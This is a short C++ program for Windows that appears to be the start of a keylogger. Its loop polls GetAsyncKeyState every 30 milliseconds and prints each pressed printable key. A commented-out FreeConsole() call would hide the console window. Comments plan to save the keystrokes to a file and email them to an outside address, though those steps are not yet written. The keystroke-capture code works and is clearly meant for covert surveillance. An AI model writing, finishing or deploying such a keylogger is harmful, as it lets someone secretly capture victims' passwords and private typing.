#include <iostream>
#include <windows.h>

int main()
{
    // FreeConsole();

    while (true) {
        Sleep(30);

        // Sense keystrokes and display them
        for (int i = 32; i < 127; i++) {
            int keyState = GetAsyncKeyState(i);
            
            if (keyState == -32767) {
                std::cout << (char) i;
            }
        }

        // Save the strokes into a text file

        // Send text to an external email
    }
}
